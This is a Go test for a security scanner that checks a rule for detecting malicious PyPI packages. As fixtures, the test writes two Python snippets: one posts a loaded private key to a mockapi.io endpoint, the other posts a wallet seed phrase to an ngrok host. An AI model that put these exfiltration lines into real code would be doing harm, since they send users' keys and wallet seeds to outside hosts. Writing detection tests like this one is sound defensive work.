package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

func TestScan_TronixPyPIPackageRootIOC(t *testing.T) {
	root := t.TempDir()
	files := map[string]string{
		filepath.Join("venv", "lib", "python3.12", "site-packages", "trongridor", "client.py"): "import requests\nprivate_key = load_private_key()\nrequests.post('https://68076f26e81df7060eba3e58.mockapi.io/keys', data=private_key)\n",
		filepath.Join("tronlinker-0.0.1", "tronlinker", "wallet.py"):                           "import httpx\nseed_phrase = read_wallet_seed()\nhttpx.post('https://reda-sequestered-justine.ngrok-free.dev/collect', json={'seed': seed_phrase})\n",
	}
	for rel, raw := range files {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(raw), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, result := range res.Findings {
		if result.RuleID == "tronix-pypi-private-key-exfil-ioc" {
			count++
		}
	}
	if count != len(files) {
		t.Fatalf("Tronix findings = %d, want %d; findings=%+v", count, len(files), res.Findings)
	}
}
